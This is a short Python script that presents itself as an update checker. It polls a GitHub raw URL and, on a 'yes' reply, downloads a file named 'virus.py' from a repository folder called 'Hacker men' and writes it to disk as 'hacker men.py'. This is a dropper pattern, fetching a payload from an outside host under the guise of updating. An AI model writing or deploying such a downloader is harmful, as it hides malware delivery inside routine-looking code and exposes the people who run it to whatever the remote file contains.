# check for updates
import requests

check_for_update = "https://raw.github.com/OomsOoms/cloud_stoage/main/Hacker%20men/Check%20for%20update"
response = requests.get(check_for_update)

# updating if it needs to
if "yes" in str(response.content):
    check_for_update = "https://raw.github.com/OomsOoms/cloud_stoage/main/Hacker%20men/virus.py"
    response = requests.get(check_for_update)
    open("hacker men.py", "wb").write(response.content) 
